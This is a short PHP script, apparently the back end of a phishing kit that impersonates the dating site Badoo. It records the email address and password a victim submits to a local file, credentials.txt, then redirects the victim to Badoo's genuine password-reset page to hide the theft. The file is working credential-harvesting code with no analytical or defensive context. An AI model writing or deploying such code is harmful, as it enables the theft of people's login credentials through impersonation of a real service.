<?php

file_put_contents("credentials.txt", "[+] Badoo -> Usuario: " . $_POST['email'] . " Conrtaseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://badoo.com/forgot/');
exit();
?>
